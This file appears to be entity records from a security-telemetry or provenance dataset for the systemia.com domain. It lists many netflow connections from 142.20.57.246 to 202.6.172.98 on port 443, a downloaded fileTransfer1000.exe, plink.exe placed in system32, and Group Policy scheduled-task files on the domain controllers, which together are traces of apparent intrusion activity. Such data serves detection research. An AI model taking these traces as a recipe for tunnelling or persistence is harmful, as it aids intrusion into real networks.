e4e82d48-24f1-463f-b1d4-0726da49edb4,{'netflow': '142.20.57.246:53886->202.6.172.98:443'},845825
481d25a9-e48e-4f76-9d4b-d8957a56db74,{'netflow': '202.6.172.98:443->142.20.57.246:53374'},829443
a9a2fcaf-360b-4990-b87e-80beb3f4d729,{'netflow': '202.6.172.98:443->142.20.57.246:54003'},860165
aedd2f1e-b26f-421e-a6b5-6a1f8837025f,{'netflow': '202.6.172.98:443->142.20.57.246:53497'},841734
cde4f5b1-4307-41f2-9efc-a93cdab87124,{'netflow': '202.6.172.98:443->142.20.57.246:53916'},847880
4fcad323-3c36-4a01-a061-9d4df14bd885,{'netflow': '202.6.172.98:443->142.20.57.246:53342'},827405
90a9b961-6b5c-4b39-b681-ddf04ebee97c,{'netflow': '142.20.57.246:53953->202.6.172.98:443'},854031
98fb2caa-7bd9-4ba7-b092-1ac39ca373f7,{'netflow': '142.20.57.246:53395->202.6.172.98:443'},831505
1cebb8a3-2e5a-4c1f-8974-26d7715b1292,{'netflow': '142.20.57.246:53396->202.6.172.98:443'},831506
07f8c39c-35c1-41fa-8fee-2b760d8aef73,{'netflow': '202.6.172.98:443->142.20.57.246:53396'},831507
99e6a26d-a468-4c61-b0a2-35d98c11ff4c,{'netflow': '202.6.172.98:443->142.20.57.246:53395'},831508
339de211-f0e6-4993-b875-36cbfbdbed22,{'netflow': '202.6.172.98:443->142.20.57.246:53953'},854033
cd3f1262-6eb0-45b0-80fe-2b79f13cbc63,{'netflow': '142.20.57.246:53994->202.6.172.98:443'},858136
6c174d5d-8a1c-488e-acc4-15142c230f01,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe:Zone.Identifier'},94234
22d0c03b-e456-4d37-90e8-c56f9e595ba4,{'file': '/Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{46A9A8CB-E14C-4589-8465-35231C3587DD}/MACHINE'},81949
86bb811b-f10f-4622-814a-208d11db8b5f,{'netflow': '202.6.172.98:443->142.20.57.246:53443'},835614
df70af23-36ea-4896-be53-83af174f909b,{'file': '/Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/MACHINE'},81950
4adaddec-76ed-448e-8a5e-e1e3e9095bed,{'file': '/Device/HarddiskVolume1/WINDOWS/SYSTEM32/GROUPPOLICY/DATASTORE/0/SYSVOL/SYSTEMIA.COM/POLICIES/{37412A2E-7EDB-406E-ABD8-FA6E1FEA5326}/MACHINE'},81951
f5fa4ed6-9098-4730-a6df-5e59e788803f,{'netflow': '142.20.57.246:53938->202.6.172.98:443'},852001
7600f93c-80c7-4380-acbe-32d4f53fce4b,{'netflow': '142.20.57.246:54004->202.6.172.98:443'},860194
1e93b5c6-fb36-4001-8e8e-0fccb2d90b8a,{'netflow': '202.6.172.98:443->142.20.57.246:53886'},845860
900c4f6a-5c0f-4d44-bc09-9c763fdf60a2,{'netflow': '202.6.172.98:443->142.20.57.246:54004'},860201
fc355157-ad9e-463c-82ad-182d2a118bc7,{'netflow': '142.20.57.246:53964->202.6.172.98:443'},856105
79bda6ec-5a99-4174-8663-92e45e36a762,{'netflow': '142.20.57.246:50054->202.6.172.98:443'},811052
cc57f9bb-6833-4291-b999-0a2752aff6a8,{'netflow': '142.20.57.246:50055->202.6.172.98:443'},811053
8d4d22d3-3e8b-4fac-abd5-319a5a664c31,{'netflow': '142.20.57.246:53444->202.6.172.98:443'},835629
a0f55bbb-90eb-48eb-b4ea-ad8051b97784,{'netflow': '202.6.172.98:443->142.20.57.246:53444'},835630
8691f983-b87b-4a98-8dd3-514f0a7fdf9d,{'netflow': '142.20.57.246:53498->202.6.172.98:443'},841779
7a588254-d92a-4fb4-b6f1-3d7f1708d8c2,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml'},79926
c5b88743-7c1d-42be-928d-ea47a475bfd8,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml'},79927
5132cc12-cb42-432b-ae4f-c7cf75eab33a,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml'},79929
076ffe7b-b8e1-4930-bf7e-b90bbe0408ea,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml'},79930
82226793-784e-49c1-87ae-917681619a96,{'netflow': '202.6.172.98:443->142.20.57.246:50055'},811067
d9e15e75-d690-4f5f-9ac0-87f7b9e6868b,{'netflow': '142.20.57.246:53924->202.6.172.98:443'},849979
9110e798-803e-4625-98ac-b5040c55ec08,{'netflow': '202.6.172.98:443->142.20.57.246:50054'},811069
f0e32e83-ac03-434b-bbd2-524fc08e5098,{'netflow': '202.6.172.98:443->142.20.57.246:53498'},841788
994749a5-a6f7-4b2d-a96c-1dc359cfd355,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml'},79934
40c1ab8e-885c-416e-b24a-3d1bc50c8ed0,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/USER/Preferences/ScheduledTasks/ScheduledTasks.xml'},79931
8c768a8e-8357-4c59-b512-9b185a1bc51d,{'file': '/Device/Mup/DC1.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml'},79935
8a191106-fafc-429d-a37a-3cf709b69d97,{'file': '/Device/Mup/DC2.systemia.com/SYSVOL/systemia.com/Policies/{59DE43A4-654B-4EB0-9D75-F2F66068034B}/User/Preferences/ScheduledTasks/ScheduledTasks.xml'},79936
ad7cf995-37d0-44c6-9561-f3f874fc35d7,{'netflow': '142.20.57.246:53284->202.6.172.98:443'},823364
cc21e8b3-f78d-43d5-ad5f-089056f3ec52,{'netflow': '202.6.172.98:443->142.20.57.246:53964'},856136
5e456fdf-5448-41a2-860e-9d19c3d60708,{'netflow': '202.6.172.98:443->142.20.57.246:53284'},823368
e9821895-3636-4c05-8369-3ca755333fcf,{'netflow': '142.20.57.246:54005->202.6.172.98:443'},860244
66ee4c41-c428-4030-a793-4565ce37f5be,{'netflow': '202.6.172.98:443->142.20.57.246:53994'},858199
0820b9a8-4c4b-4363-8808-310d121b3a72,{'netflow': '202.6.172.98:443->142.20.57.246:51149'},815197
7be10927-c26e-4eb5-8071-ef099a7ad8d9,{'netflow': '142.20.57.246:53887->202.6.172.98:443'},845921
c6b45579-557e-4265-8567-621530f0ff8f,{'netflow': '202.6.172.98:443->142.20.57.246:53938'},852068
2cb9358d-99a8-48a3-8265-cbf6cd65e450,{'netflow': '142.20.57.246:53311->202.6.172.98:443'},825446
ef779a13-8b22-449e-9178-53f96dc58848,{'netflow': '202.6.172.98:443->142.20.57.246:53887'},845926
3c339e74-581d-423b-8f68-194a703ad17f,{'netflow': '142.20.57.246:53393->202.6.172.98:443'},831594
905e4ec1-dd8c-49d5-a9a2-8df315508a56,{'netflow': '142.20.57.246:53470->202.6.172.98:443'},837740
d3ea53c6-9867-4b06-a36e-a770b6db19f5,{'netflow': '142.20.57.246:53485->202.6.172.98:443'},839792
1fa3a7cd-c0a3-4593-9219-123d1dffe33b,{'netflow': '142.20.57.246:53445->202.6.172.98:443'},835697
7548c5e8-aa50-43a7-923d-94850fe9bc44,{'netflow': '142.20.57.246:53375->202.6.172.98:443'},829554
a37a567a-77d2-4801-886c-e79b367b05ef,{'netflow': '142.20.57.246:53285->202.6.172.98:443'},823414
9385e52e-ce98-46a9-99f1-e0e732711ae9,{'netflow': '202.6.172.98:443->142.20.57.246:53485'},839799
133c3f6e-757d-4691-b3a4-b90f8de831ef,{'netflow': '202.6.172.98:443->142.20.57.246:53470'},837757
9d2b6e84-cc5d-46e3-a554-d5e903878dd5,{'netflow': '142.20.57.246:53289->202.6.172.98:443'},823423
41928abe-8d5e-42d7-ad46-85270dde780b,{'netflow': '202.6.172.98:443->142.20.57.246:53285'},823428
4ead1bd0-d65b-4af8-93fc-adf367eba955,{'netflow': '142.20.57.246:53954->202.6.172.98:443'},854149
ec637527-01dc-41fc-b5b1-73c0ef067fc9,{'netflow': '202.6.172.98:443->142.20.57.246:53289'},823432
76e28b05-4ea2-4b1e-96c1-f28a220b2332,{'netflow': '202.6.172.98:443->142.20.57.246:53311'},825483
9f2b06dc-a3d2-49b7-82e7-402963494739,{'netflow': '202.6.172.98:443->142.20.57.246:53375'},829589
8c949cd4-62a5-44c0-854c-5383714d8e0f,{'netflow': '202.6.172.98:443->142.20.57.246:53445'},835734
dd8cf0ab-9df7-4bda-9b8f-f692a57c5158,{'netflow': '202.6.172.98:443->142.20.57.246:53954'},854167
f6200107-2419-4cba-bce8-2d1325366d91,{'netflow': '142.20.57.246:53433->202.6.172.98:443'},833701
16af85ad-a129-4ae7-a150-f5559912b87c,{'netflow': '142.20.57.246:53446->202.6.172.98:443'},835749
68c37032-3e80-486b-8e91-d8a64dbbbd7a,{'netflow': '142.20.57.246:49997->202.6.172.98:443'},809130
1effe0e3-eff6-4dce-a579-5ae5f2ae8d46,{'netflow': '202.6.172.98:443->142.20.57.246:53433'},833709
93b8d809-6257-49f5-a7b5-3c0ad4c9b11a,{'netflow': '142.20.57.246:53965->202.6.172.98:443'},856243
ce94c797-08dd-4359-9449-347b5ddf7f25,{'netflow': '142.20.57.246:53917->202.6.172.98:443'},848055
4af8e30a-f454-477d-8c5d-e06af182a82c,{'netflow': '202.6.172.98:443->142.20.57.246:53924'},850105
9bd2a2d1-c3e6-4b09-b602-c22b160b5f4e,{'netflow': '142.20.57.246:49982->202.6.172.98:443'},807098
b1964757-60a0-4cca-a417-ea0c21c8fb23,{'netflow': '202.6.172.98:443->142.20.57.246:49982'},807101
8a89d245-e24b-4871-8138-e5f9647ebb42,{'netflow': '142.20.57.246:53394->202.6.172.98:443'},831678
12e50444-9e42-4d4c-acad-6d4caf38236f,{'netflow': '142.20.57.246:53343->202.6.172.98:443'},827585
f62f18a4-c393-4e52-8ac9-3f700a9ba52d,{'netflow': '202.6.172.98:443->142.20.57.246:53965'},856260
c75d3c83-0b4c-47ad-ba85-f9d039a60983,{'netflow': '142.20.57.246:53499->202.6.172.98:443'},841925
548aea15-a08a-46bc-b6b0-6f2e091ed82b,{'netflow': '202.6.172.98:443->142.20.57.246:49997'},809157
98e7344a-c23e-4652-909d-15cbcbf30288,{'netflow': '202.6.172.98:443->142.20.57.246:53917'},848072
5ad0d40d-e49a-4238-9e6d-b53eef28d74c,{'netflow': '142.20.57.246:53486->202.6.172.98:443'},839888
9bf167a2-1c8f-4958-986c-b1b875e732a2,{'netflow': '142.20.57.246:53874->202.6.172.98:443'},843984
5381127b-7cbe-498a-85b4-9e32fcc42b00,{'netflow': '202.6.172.98:443->142.20.57.246:53874'},843987
9d6c4201-4048-4d91-b61a-3b2444aea930,{'netflow': '202.6.172.98:443->142.20.57.246:51163'},815317
67f2007a-6c36-48df-ace7-05b07193650c,{'netflow': '202.6.172.98:443->142.20.57.246:53486'},839907
01618b3a-e621-46fb-a6af-6da6c8ffd48e,{'netflow': '202.6.172.98:443->142.20.57.246:54005'},860397
40956625-6f7e-4c41-ade6-d05d8622c8d9,{'netflow': '142.20.57.246:50056->202.6.172.98:443'},811245
e4e92432-3804-467f-96cd-31d1872cc04b,{'netflow': '142.20.57.246:50057->202.6.172.98:443'},811248
9ee8af1a-49d1-4347-96bf-4962bb0896f0,{'netflow': '142.20.57.246:49983->202.6.172.98:443'},807152
85f3a8c5-8bfd-44bf-a8df-8fe989ad31a7,{'netflow': '142.20.57.246:53399->202.6.172.98:443'},831735
836c1ca9-2cab-49b5-8be9-d7db69f722a5,{'netflow': '142.20.57.246:53312->202.6.172.98:443'},825592
91ed4b9c-7676-40c8-b009-891f9cc36982,{'netflow': '202.6.172.98:443->142.20.57.246:53399'},831737
71d0e5b5-e295-41eb-89ff-7d20a1edb884,{'netflow': '142.20.57.246:53313->202.6.172.98:443'},825593
2f2cb020-9c22-4b96-9e8f-ccfd439d3868,{'netflow': '202.6.172.98:443->142.20.57.246:53499'},841975
fd720d68-d5a6-40ec-a2ff-21e4bf714b39,{'netflow': '142.20.57.246:53290->202.6.172.98:443'},823554
1945ae83-6f03-4fe5-a05b-3d3c377c255a,{'netflow': '202.6.172.98:443->142.20.57.246:50056'},811266
26280caa-8aa8-4780-9359-faabfb671ee0,{'netflow': '202.6.172.98:443->142.20.57.246:53290'},823558
b1b553be-fa42-4054-b0af-2d17fdd8b1dc,{'netflow': '202.6.172.98:443->142.20.57.246:53446'},835852
63f932d6-0925-40d4-80e8-9240bcd8900d,{'netflow': '202.6.172.98:443->142.20.57.246:49983'},807187
bf6bb4ea-a78d-493b-b12b-80ee914007ec,{'netflow': '142.20.57.246:53888->202.6.172.98:443'},846101
e77a9ca1-00e4-426b-82a0-f04151d65d4e,{'file': '/Device/HarddiskVolume1/windows/system32/plink.exe'},100630
2b51748e-5826-4ba9-a68a-51ab0cf67eeb,{'netflow': '142.20.57.246:49971->202.6.172.98:443'},805144
bfcd3bb7-2157-4033-b2e5-3dd9753385dc,{'netflow': '142.20.57.246:53966->202.6.172.98:443'},856347
c6bcb9bd-67e5-4a16-860e-7916aea8c176,{'netflow': '142.20.57.246:53292->202.6.172.98:443'},823585
88b05cf8-1aa5-4e99-88c0-06032ee47f46,{'netflow': '202.6.172.98:443->142.20.57.246:53966'},856354
87f1ddc7-60d5-4ab9-b14a-7e1aa98be43d,{'netflow': '142.20.57.246:53376->202.6.172.98:443'},829734
aad3f358-4f15-47d1-ae5c-659e774bc9db,{'netflow': '142.20.57.246:53925->202.6.172.98:443'},850218
a6244db5-38de-4b2d-a8d3-cb0aba00b9b6,{'netflow': '142.20.57.246:53875->202.6.172.98:443'},844076
e776f152-bdba-4221-8e36-ccc51cc59a33,{'netflow': '202.6.172.98:443->142.20.57.246:53875'},844077
08ddb839-af03-4350-b919-231b1ae365ba,{'netflow': '202.6.172.98:443->142.20.57.246:53925'},850223
5b2b2ecf-39b0-4f24-aa21-0d2b9e853144,{'netflow': '142.20.57.246:53447->202.6.172.98:443'},835893
c7674ed1-64f5-4e02-b74d-2c599afec50a,{'netflow': '142.20.57.246:53500->202.6.172.98:443'},842040
e260ef04-8a17-4eeb-996c-be7cbd620b57,{'netflow': '202.6.172.98:443->142.20.57.246:53500'},842041
2e0a43fd-2e1c-492f-80b4-5167553e4031,{'netflow': '142.20.57.246:54006->202.6.172.98:443'},860476
148bd655-c5fd-420b-808c-da9d66c9c706,{'netflow': '142.20.57.246:53250->202.6.172.98:443'},821567
b4ebd7a5-1616-4cd3-9b17-9b0ef1ba1309,{'netflow': '142.20.57.246:53400->202.6.172.98:443'},831807
2d46366a-2da6-4e9e-b6a6-41f2e2412d75,{'netflow': '202.6.172.98:443->142.20.57.246:53400'},831808
30aef542-1780-4a89-9e64-6fd74da98bf6,{'netflow': '202.6.172.98:443->142.20.57.246:53447'},835906
e34e7fe5-a7c5-4f6e-8484-2c247a0fffdc,{'netflow': '142.20.57.246:53344->202.6.172.98:443'},827715
ad4d43b0-726a-44c1-8712-130b1091ee88,{'netflow': '202.6.172.98:443->142.20.57.246:53343'},827718
7ea47bfe-bdbc-4b16-b609-63e29b3ee1dc,{'netflow': '202.6.172.98:443->142.20.57.246:54006'},860491
8a12102d-794e-47fa-8ebf-ef2ba71f7b7b,{'netflow': '202.6.172.98:443->142.20.57.246:53344'},827727
9ca79e14-3032-4928-97e1-cb8195325b96,{'netflow': '142.20.57.246:53434->202.6.172.98:443'},833883
e27f860d-b4b2-452e-9c9a-2ccf0924d3ba,{'netflow': '202.6.172.98:443->142.20.57.246:53376'},829804
24d3ce08-86ed-40ec-8235-27bad9c89c79,{'netflow': '142.20.57.246:53471->202.6.172.98:443'},837996
bcfb1be8-d3ea-43e4-af2f-4c66941c8cde,{'netflow': '202.6.172.98:443->142.20.57.246:53888'},846188
86f73a05-4b54-4560-a195-d6df8d456aea,{'netflow': '202.6.172.98:443->142.20.57.246:50057'},811375
26c820e3-35a1-443a-83b0-2c055e507011,{'netflow': '202.6.172.98:443->142.20.57.246:53292'},823664
f43ef225-d6dd-47e8-93f9-d558980dfabc,{'netflow': '202.6.172.98:443->142.20.57.246:53313'},825710
fc5fc9bc-62a7-406d-a68e-f53f86a36561,{'netflow': '202.6.172.98:443->142.20.57.246:53889'},846194
fb50bcde-f6aa-4180-8b16-ce4822022376,{'netflow': '142.20.57.246:49998->202.6.172.98:443'},809328
67acbbae-747b-4699-8aef-c2f95dd27f30,{'netflow': '202.6.172.98:443->142.20.57.246:53312'},825711
6ea27b58-bcc0-48c0-829a-c01d2dd4f054,{'netflow': '142.20.57.246:53889->202.6.172.98:443'},846193
d331d035-7e4d-4e61-9da7-b5287ada68a0,{'netflow': '202.6.172.98:443->142.20.57.246:49971'},805241
489c07f8-0ca9-4a81-aa92-8b26f5fc5cf7,{'netflow': '142.20.57.246:53939->202.6.172.98:443'},852351
94c522c4-fad3-4c32-b56f-66eca9ff2a6c,{'netflow': '142.20.57.246:53926->202.6.172.98:443'},850308
4d7a244b-9cb0-4894-9092-570552676b58,{'netflow': '202.6.172.98:443->142.20.57.246:53434'},833926
76955263-c3eb-4ba2-8ab3-df287fd2a7bf,{'netflow': '142.20.57.246:53449->202.6.172.98:443'},835977
ee3586c6-ee43-45eb-a09a-af8304e7e9ed,{'netflow': '202.6.172.98:443->142.20.57.246:53449'},835982
02a89915-f713-4c12-8c8a-b92e051c1ada,{'netflow': '142.20.57.246:53995->202.6.172.98:443'},858511
d4d41711-66db-4618-8c3f-441fb3790ab3,{'netflow': '202.6.172.98:443->142.20.57.246:53471'},838033
43236e24-6987-4fce-a3a8-c5a57d59395b,{'netflow': '142.20.57.246:54009->202.6.172.98:443'},860565
8bbfcde2-d952-4c71-9300-8a6eac107799,{'netflow': '142.20.57.246:53918->202.6.172.98:443'},848279
51f6c07b-de89-42b4-a46f-62abff720e5f,{'netflow': '142.20.57.246:53501->202.6.172.98:443'},842144
3bfec792-ca60-4762-9947-9e1f6e271075,{'netflow': '202.6.172.98:443->142.20.57.246:53501'},842145
eec87c3e-6d10-4a2e-98b0-0ea4b5893755,{'netflow': '202.6.172.98:443->142.20.57.246:53939'},852396
e16e34ce-2269-4314-b31a-7afb9f585b85,{'netflow': '142.20.57.246:53487->202.6.172.98:443'},840116
9b332521-fbda-4734-98f7-ed8e8f171069,{'netflow': '142.20.57.246:53502->202.6.172.98:443'},842164
5be22fee-d9cf-4f28-aed2-5d4c9ffe5f61,{'netflow': '142.20.57.246:53876->202.6.172.98:443'},844213
bca9c58d-10ec-46d0-9087-3afdf1192065,{'netflow': '202.6.172.98:443->142.20.57.246:53487'},840119
ec2f6d4b-1bd3-4af5-9a88-7979221b030c,{'netflow': '142.20.57.246:49984->202.6.172.98:443'},807352
612bba5b-ad08-42b2-8af2-111c9767cedb,{'netflow': '202.6.172.98:443->142.20.57.246:49984'},807353
cce41aab-e64b-4afc-b6df-bb3aace2b4a9,{'netflow': '202.6.172.98:443->142.20.57.246:53502'},842171
937ac57e-cb4a-409b-8bc9-bc661f0442b4,{'netflow': '202.6.172.98:443->142.20.57.246:53250'},821699
21c248b5-d2d0-491e-9259-9a9cc2e31c4f,{'netflow': '202.6.172.98:443->142.20.57.246:53876'},844234
97ab645e-054e-44a2-a4db-982c5940fa4e,{'netflow': '142.20.57.246:53896->202.6.172.98:443'},846290
8d6385a7-51ae-4b6d-b01d-9262fdd562ba,{'netflow': '142.20.57.246:53314->202.6.172.98:443'},825814
f60dcdc7-93b6-4185-ad59-28ead7e2c6d5,{'netflow': '142.20.57.246:53967->202.6.172.98:443'},856535
df737f2d-bd10-4b10-bf19-4ab396633183,{'netflow': '202.6.172.98:443->142.20.57.246:53314'},825815
ca80dde6-98be-455b-aa92-b7c29136aea6,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe'},94679
a195e01f-f37f-46b3-a2fc-e97601c1b52d,{'netflow': '142.20.57.246:53955->202.6.172.98:443'},854497
75c8a2f3-04d9-4e34-893e-9effe3882fde,{'netflow': '202.6.172.98:443->142.20.57.246:53918'},848354
93ab979b-3252-4e76-9d23-71b01555c8bb,{'netflow': '142.20.57.246:53315->202.6.172.98:443'},825826
a7164ea8-b944-4192-bec1-8a90d6c9de18,{'netflow': '202.6.172.98:443->142.20.57.246:53896'},846306
35be02da-74a8-4dc3-b29a-b384cddd6d39,{'netflow': '202.6.172.98:443->142.20.57.246:53315'},825835
fb1bcdf1-2302-46e6-8b98-a4aaed2d2bc7,{'netflow': '202.6.172.98:443->142.20.57.246:53955'},854510
3d446335-e53e-4cfb-9131-08265e2d397f,{'netflow': '202.6.172.98:443->142.20.57.246:49998'},809459
f9126526-9679-43fd-ab9a-bfb7a085570b,{'netflow': '202.6.172.98:443->142.20.57.246:54009'},860673
98e35f45-9d72-409a-8f49-83ee9f73781a,{'netflow': '142.20.57.246:53401->202.6.172.98:443'},832001
553d85ae-28a4-4c7d-acf7-4f263853530d,{'netflow': '202.6.172.98:443->142.20.57.246:53401'},832007
6b628901-8c09-46f6-91c1-ee62fcf2bc96,{'netflow': '202.6.172.98:443->142.20.57.246:53995'},858633
edd558c3-67bc-4af0-943c-e79c725cb4a6,{'netflow': '202.6.172.98:443->142.20.57.246:53967'},856587
ca3c9475-fc80-41ee-b46a-5e07ffbbe8b6,{'netflow': '142.20.57.246:53316->202.6.172.98:443'},825872
c11c4087-5f9f-4b46-9fed-7e81187c4a61,{'netflow': '142.20.57.246:53472->202.6.172.98:443'},838161
e1f4e70f-e3e9-4daf-8646-d453c678a7e2,{'netflow': '142.20.57.246:53317->202.6.172.98:443'},825873
179b2eed-c4ef-4849-bc8a-90fa9f5872f2,{'netflow': '142.20.57.246:53318->202.6.172.98:443'},825875
d23047e2-ad5b-4899-b867-4e51cff360a7,{'netflow': '202.6.172.98:443->142.20.57.246:53317'},825876
dae5e0cb-27a3-4705-a5b3-cf728af1aa85,{'netflow': '202.6.172.98:443->142.20.57.246:53316'},825877
413a3588-76aa-477a-9232-b1e0bda5a89a,{'netflow': '142.20.57.246:53319->202.6.172.98:443'},825878
f75a5a66-1045-44f5-89d2-29c5b6b8566c,{'netflow': '142.20.57.246:53320->202.6.172.98:443'},825879
a1625067-c49d-4434-864e-848d86b73866,{'netflow': '202.6.172.98:443->142.20.57.246:53318'},825880
bfffe44a-1614-4c1d-bec8-ce9a68aba040,{'netflow': '202.6.172.98:443->142.20.57.246:53319'},825883
a02d4380-b76c-463d-affe-958354b447d3,{'netflow': '202.6.172.98:443->142.20.57.246:53320'},825884
d7c2a23a-748c-49e9-9b7d-b19779e62502,{'netflow': '142.20.57.246:53323->202.6.172.98:443'},825891
bec61871-4f7b-4427-bf8a-082b8652744a,{'netflow': '142.20.57.246:53378->202.6.172.98:443'},829992
ff1a5365-cdbc-4e67-b76d-e59a98c68a2d,{'netflow': '142.20.57.246:49985->202.6.172.98:443'},807465
9c40df1a-ae87-4605-a44d-f2a7e4f1d2b8,{'netflow': '202.6.172.98:443->142.20.57.246:53323'},825900
b448f588-0b38-4653-a520-fd82d3f42b7a,{'netflow': '142.20.57.246:53324->202.6.172.98:443'},825901
5d1d1232-3165-4910-b982-2399004452b1,{'netflow': '142.20.57.246:50071->202.6.172.98:443'},811566
7d65d936-0757-4bb7-bce4-c2964055e421,{'netflow': '142.20.57.246:50072->202.6.172.98:443'},811567
81c79526-542b-4bb3-bbd2-ce923b6da3df,{'netflow': '142.20.57.246:53503->202.6.172.98:443'},842285
20f749a4-879f-4eea-9411-31564a49a79b,{'netflow': '142.20.57.246:49972->202.6.172.98:443'},805425
3d3d414b-69fa-41bb-be71-a5862b26a0c6,{'netflow': '142.20.57.246:53345->202.6.172.98:443'},827954
aa934b14-4d67-4ed5-a6b1-804c1e0bec31,{'netflow': '202.6.172.98:443->142.20.57.246:53324'},825906
e9f148c3-b262-44fe-9665-bb32b3c84a61,{'netflow': '202.6.172.98:443->142.20.57.246:53472'},838200
8f51fc28-a92e-4145-a6ca-bb7853bd5685,{'netflow': '142.20.57.246:54012->202.6.172.98:443'},860732
914609da-70a8-468d-ab4e-5815b4d6de8b,{'netflow': '202.6.172.98:443->142.20.57.246:49972'},805436
41bf7ac5-9b67-4cda-8b21-e4673d7ef57a,{'netflow': '202.6.172.98:443->142.20.57.246:50071'},811583
e01b9128-0065-4a14-ba10-863f2bc813b3,{'netflow': '202.6.172.98:443->142.20.57.246:50072'},811584
6aabc3cd-ebd6-45f8-b483-dda9b9d05bff,{'netflow': '142.20.57.246:53877->202.6.172.98:443'},844351
2209b75c-72fb-4bcd-9df8-11d52b39d227,{'netflow': '202.6.172.98:443->142.20.57.246:53877'},844354
b9f77069-1af7-452e-8b46-b4f98fa8ec46,{'netflow': '142.20.57.246:53956->202.6.172.98:443'},854597
0ebfc37c-43fb-4573-ab96-45baeec17bf6,{'netflow': '142.20.57.246:53488->202.6.172.98:443'},840262
de10aa49-1d8a-49e8-a64b-102798668f71,{'netflow': '142.20.57.246:53450->202.6.172.98:443'},836167
d6ae8968-bb5b-49a4-9fc4-d1da066961e7,{'netflow': '202.6.172.98:443->142.20.57.246:53956'},854600
7adeeb2e-7b92-469b-a9c0-e868ddf4c84e,{'netflow': '202.6.172.98:443->142.20.57.246:53450'},836168
6a48b1ba-a6cf-4257-a308-905efe9a0664,{'netflow': '142.20.57.246:53299->202.6.172.98:443'},823888
7e31fff5-8158-4a5a-b47b-31d42e34a91d,{'netflow': '202.6.172.98:443->142.20.57.246:49985'},807505
ee95e905-a84b-4fdb-9e8b-385aa89a127a,{'netflow': '142.20.57.246:53379->202.6.172.98:443'},830033
134978b1-0d1e-4e35-b4d5-9b9067ff2cdf,{'netflow': '202.6.172.98:443->142.20.57.246:53299'},823891
0438d82d-c332-45b2-8b31-a05132f7c877,{'netflow': '202.6.172.98:443->142.20.57.246:53503'},842324
f7eba821-d585-49ff-bed7-8cdd0985a2dd,{'netflow': '202.6.172.98:443->142.20.57.246:54012'},860755
9d3eabd8-1ad6-4972-bd0f-53bcccc6fce8,{'netflow': '142.20.57.246:53899->202.6.172.98:443'},846423
625c39df-f913-4201-ac97-aedc0a63eeba,{'netflow': '142.20.57.246:49986->202.6.172.98:443'},807513
066aad08-642c-4bf8-901f-bc59c68fb868,{'netflow': '142.20.57.246:53325->202.6.172.98:443'},825945
f08cae4f-c56c-4af9-8a8e-b8b5dd776fdd,{'netflow': '202.6.172.98:443->142.20.57.246:49986'},807516
eb7d9277-8346-4d24-8cdb-48d6d2a44bae,{'netflow': '202.6.172.98:443->142.20.57.246:53926'},850525
9a64d3d3-892f-4944-a087-406c6f768654,{'netflow': '202.6.172.98:443->142.20.57.246:53378'},830048
2b1e785b-0631-4508-9e37-0a6b3f4f3153,{'netflow': '202.6.172.98:443->142.20.57.246:53379'},830049
a78ee0ec-e73a-42aa-b39b-0599e6077439,{'netflow': '142.20.57.246:53927->202.6.172.98:443'},850528
43d179ee-7c22-4640-b9a5-8625345b6a2e,{'netflow': '142.20.57.246:53346->202.6.172.98:443'},828007
1ae71da2-f924-48d9-8d22-10cd23364c9f,{'netflow': '202.6.172.98:443->142.20.57.246:53345'},828008
e85a23d5-7965-48b9-b4d8-5e97c3d0e493,{'netflow': '142.20.57.246:53380->202.6.172.98:443'},830060
1e73c8cb-7e16-474f-ad4d-bfadd43786a2,{'netflow': '142.20.57.246:53451->202.6.172.98:443'},836204
80e3b781-f1a5-4d07-ba51-a57d4d408c15,{'netflow': '202.6.172.98:443->142.20.57.246:53488'},840307
29ca825a-32b9-4334-9eec-f2695f997a88,{'netflow': '202.6.172.98:443->142.20.57.246:53346'},828026
bde110fa-c60a-4825-8b39-8c638192d582,{'netflow': '142.20.57.246:50073->202.6.172.98:443'},811642
4b46b97f-bef3-4365-9ee3-964897aadd1c,{'netflow': '142.20.57.246:50074->202.6.172.98:443'},811644
9dc7e5e7-9b13-42da-b08f-24adf4cf01d3,{'netflow': '142.20.57.246:53977->202.6.172.98:443'},856701
a0e55c67-09f3-418f-9896-fe138c691999,{'netflow': '202.6.172.98:443->142.20.57.246:53402'},832132
521e478b-c1f3-4f20-82bb-0a93a2f70c4f,{'netflow': '202.6.172.98:443->142.20.57.246:53977'},856713
ce928b33-0345-4f98-966b-088271ab165c,{'netflow': '142.20.57.246:53402->202.6.172.98:443'},832139
b3896101-d80c-4902-9e5e-af7c4d30a2df,{'file': '/Device/HarddiskVolume1/Windows/system32/plink.exe'},84619
864d896a-e430-4d12-a876-18f6c38398d4,{'netflow': '142.20.57.246:53504->202.6.172.98:443'},842381
41f5b897-bf3b-4982-8c03-f6aa5a3db098,{'netflow': '142.20.57.246:53435->202.6.172.98:443'},834190
1577a7c9-8c08-4a94-9a16-a031dcdcff4c,{'netflow': '202.6.172.98:443->142.20.57.246:53927'},850579
7cfe02d2-b403-4488-8515-703b85d7780a,{'netflow': '142.20.57.246:53979->202.6.172.98:443'},856725
